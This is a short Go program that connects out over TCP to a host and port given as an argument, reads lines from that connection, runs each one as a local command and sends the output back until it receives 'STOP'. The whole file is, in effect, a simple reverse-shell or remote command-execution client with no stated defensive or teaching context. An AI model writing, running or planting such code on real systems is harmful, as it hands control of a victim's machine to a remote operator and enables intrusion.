package main

import (
        "bufio"
        "fmt"
        "net"
        "os"
        "strings"
        "os/exec"
)

func command(cmd string) string {
  out, err := exec.Command(cmd).Output()
  if err != nil {
    return "nil"
  }
  output := string(out[:])
  return output
}

func main() {
        arguments := os.Args
        if len(arguments) == 1 {
                fmt.Println("Please provide host:port.")
                return
        }

        CONNECT := arguments[1]
        c, err := net.Dial("tcp", CONNECT)
        if err != nil {
                fmt.Println(err)
                return
        }

        var iter int = 1

        for {
          message, _ := bufio.NewReader(c).ReadString('\n')


          if strings.TrimSpace(string(message)) == "STOP" {
            fmt.Println("TCP client exiting...")
            fmt.Fprintf(c, "STOP")
            return
          }

          output := command(strings.TrimSpace(message))
          if output == "nil" {
            return
            } else {
              message = output
            }

            fmt.Println(output)
            output = strings.Replace(output, "\n", " ", -1)
            fmt.Fprintf(c, output+"\n")
            // fmt.Print("->: " + message)

            iter++

        }
}
